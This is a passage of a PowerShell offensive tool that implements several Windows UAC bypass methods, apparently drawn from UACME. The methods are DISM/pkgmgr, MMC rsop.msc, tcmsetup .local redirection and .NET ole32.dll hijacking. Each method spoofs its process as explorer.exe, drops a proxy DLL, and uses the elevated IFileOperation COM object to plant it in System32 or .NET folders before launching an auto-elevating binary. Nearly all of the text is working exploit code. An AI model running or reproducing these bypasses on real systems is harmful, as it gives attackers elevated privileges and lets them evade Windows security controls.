            Invoke-IFileOperation

            # Exploit logic
            echo "[>] Performing elevated IFileOperation::MoveItem operation.."
            $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\System32\sysprep\'), "cryptbase.dll")
            $IFileOperation.PerformOperations()
            echo "`n[?] Executing sysprep.."
            IEX $($env:SystemRoot + '\System32\sysprep\sysprep.exe')

            # Clean-up
            echo "[!] UAC artifact: $($env:SystemRoot + '\System32\sysprep\cryptbase.dll')`n"
        }

        # UACME method 23
        'ucmDismMethod'
        {
            # Hybrid DISM method: package.xml -> pkgmgr.exe
            # Works on x64 Win7-Win10 (unpatched)
            if ($OSMajorMinor -lt 6.1) {
                echo "[!] Your OS does not support this method!`n"
                Return
            } if (!$x64) {
                echo "[!] This method is only supported on 64-bit!`n"
                Return
            }

            # Impersonate explorer.exe
            echo "`n[!] Impersonating explorer.exe!"
            Masquerade-PEB -BinPath "C:\Windows\explorer.exe"

            if ($DllPath) {
                echo "[>] Using custom proxy dll.."
                echo "[+] Dll path: $DllPath"
            } else {
                # Write Yamabiko.dll to disk
                echo "[>] Dropping proxy dll.."
                Emit-Yamabiko
            }

            # Write package XML to disk
            $PackagePath = $env:Temp + "\pac$(Get-Random).xml"
            echo "[>] Creating XML trigger: $PackagePath"
            $WinPackageData > $PackagePath

            # Expose IFileOperation COM object
            Invoke-IFileOperation

            # Exploit logic
            echo "[>] Performing elevated IFileOperation::MoveItem operation.."
            $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\System32\'), "dismcore.dll")
            $IFileOperation.PerformOperations()
            echo "`n[?] Executing PkgMgr.."
            IEX $($env:SystemRoot + '\System32\PkgMgr.exe /n:' + $PackagePath)

            # Clean-up
            echo "[!] UAC artifact: $($env:SystemRoot + '\System32\dismcore.dll')"
            echo "[!] UAC artifact: $PackagePath`n"
        }

        # UACME method 20
        'UacMethodMMC2'
        {
            # Hybrid MMC method: mmc -> rsop.msc -> wbemcomn.dll
            # Works on x64 Win7-Win10 (unpatched)
            if ($OSMajorMinor -lt 6.1) {
                echo "[!] Your OS does not support this method!`n"
                Return
            } if (!$x64) {
                echo "[!] This method is only supported on 64-bit!`n"
                Return
            }

            # Impersonate explorer.exe
            echo "`n[!] Impersonating explorer.exe!"
            Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
        
            if ($DllPath) {
                echo "[>] Using custom proxy dll.."
                echo "[+] Dll path: $DllPath"
            } else {
                # Write Yamabiko.dll to disk
                echo "[>] Dropping proxy dll.."
                Emit-Yamabiko
            }

            # Expose IFileOperation COM object
            Invoke-IFileOperation

            # Exploit logic
            echo "[>] Performing elevated IFileOperation::MoveItem operation.."
            $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\System32\wbem\'), "wbemcomn.dll")
            $IFileOperation.PerformOperations()
            echo "`n[?] Executing mmc.."
            IEX $($env:SystemRoot + '\System32\mmc.exe rsop.msc')

            # Clean-up
            echo "[!] UAC artifact: $($env:SystemRoot + '\System32\wbem\wbemcomn.dll')`n"
        }

        # UAC "0day" ¯\_(ツ)_/¯
        'UacMethodTcmsetup'
        {
            # Hybrid tcmsetup method: tcmsetup -> tcmsetup.exe.local -> comctl32.dll
            # Works on x64/x32 Win7-Win10 (unpatched)
            if ($OSMajorMinor -lt 6.1) {
                echo "[!] Your OS does not support this method!`n"
                Return
            }

            # Impersonate explorer.exe
            echo "`n[!] Impersonating explorer.exe!"
            Masquerade-PEB -BinPath "C:\Windows\explorer.exe"

            if ($DllPath) {
                echo "[>] Using custom proxy dll.."
                echo "[+] Dll path: $DllPath"
            } else {
                # Write Yamabiko.dll to disk
                echo "[>] Dropping proxy dll.."
                Emit-Yamabiko
            }

            # Create tcmsetup.exe.Local folder in %temp%
            $TempFolder = $env:Temp + "\tcm$(Get-Random)"
            echo "[>] Creating .local trigger folder: $TempFolder"
            New-Item -Path $TempFolder -ItemType directory |Out-Null

            # Create possible sub-directories
            dir $($env:SystemRoot + '\WinSxS') |where-object {
                $_.PSIsContainer -and $_.Name -like "*microsoft.windows.common*"
            } | foreach {
                New-Item -Path $TempFolder -Name $_.Name -ItemType directory |Out-Null
                Copy-Item $DllPath -destination $($TempFolder + '\' + $_.Name + '\comctl32.dll')
            }

            # Remove proxy dll
            Del $DllPath

            # Expose IFileOperation COM object
            Invoke-IFileOperation

            # Exploit logic
            echo "[>] Performing elevated IFileOperation::MoveItem operation.."
            $IFileOperation.MoveItem($TempFolder, $($env:SystemRoot + '\System32\'), "tcmsetup.exe.Local")
            $IFileOperation.PerformOperations()

            echo "`n[?] Executing tcmsetup.."
            IEX $($env:SystemRoot + '\System32\tcmsetup.exe')

            # Clean-up
            echo "[!] UAC artifact: $($env:SystemRoot + '\System32\tcmsetup.exe.Local\')`n"
        }

        # UAC "0day" ¯\_(ツ)_/¯
        'UacMethodNetOle32'
        {
            # Hybrid MMC method: mmc some.msc -> Microsoft.NET\Framework[64]\..\ole32.dll
            # Works on x64/x32 Win7-Win10 (unpatched)
            if ($OSMajorMinor -lt 6.1) {
                echo "[!] Your OS does not support this method!`n"
                Return
            }

            # Impersonate explorer.exe
            echo "`n[!] Impersonating explorer.exe!"
            Masquerade-PEB -BinPath "C:\Windows\explorer.exe"

            if ($DllPath) {
                echo "[>] Using custom proxy dll.."
                echo "[+] Dll path: $DllPath"
            } else {
                # Write Yamabiko.dll to disk
                echo "[>] Dropping proxy dll.."
                Emit-Yamabiko
            }

            # Get default .NET version
            [String]$Net_Version = [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion

            # Get count of PowerShell processes
            $PS_InitCount = @(Get-Process -Name powershell).Count

            # Expose IFileOperation COM object
            Invoke-IFileOperation

            # Exploit logic
            echo "[>] Performing elevated IFileOperation::MoveItem operation.."
            # x32/x64 .NET folder
            if ($x64) {
                $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\'), "ole32.dll")
            } else {
                $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\'), "ole32.dll")
            }
            $IFileOperation.PerformOperations()
            echo "`n[?] Executing mmc.."
            IEX $($env:SystemRoot + '\System32\mmc.exe gpedit.msc')

            # Move Yamabiko back to %tmp% after it loads to avoid infinite shells!
            while ($true) {
                $PS_Count = @(Get-Process -Name powershell).Count
                if ($PS_Count -gt $PS_InitCount) {
                    try {
                        # x32/x64 .NET foler
                        if ($x64) {
                            $IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')
                        } else {
                            $IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')
                        }
                        $IFileOperation.PerformOperations()
                        break
                    } catch {
                        # Sometimes IFileOperation throws an exception
                        # when executed twice in a row, just rerun..
                    }
                }
            }

            # Clean-up
            echo "[!] UAC artifact: $($env:Temp + '\ole32.dll')`n"
        }
    }
}